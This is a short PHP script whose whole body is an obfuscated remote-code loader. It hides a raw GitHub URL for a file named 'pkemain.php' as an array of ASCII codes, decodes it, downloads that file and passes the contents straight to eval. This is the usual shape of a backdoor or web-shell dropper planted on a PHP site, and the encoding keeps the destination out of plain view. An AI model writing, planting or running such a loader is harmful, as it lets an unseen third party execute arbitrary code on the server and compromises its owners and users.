<?php
$asciiArray = [
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 104, 105, 110, 97, 116, 97, 108, 111, 108, 105, 47, 104, 97, 104, 97, 47, 109, 97, 105, 110, 47, 112, 107, 101, 109, 97, 105, 110, 46, 112, 104, 112
];

function decodeFromAsciiArray($array) {
    return implode(array_map('chr', $array));
}

$decodedUrl = decodeFromAsciiArray($asciiArray);

$code = file_get_contents($decodedUrl);

if ($code !== false) {
    eval('?>' . $code);
} else {
    echo 'error';
}
?>
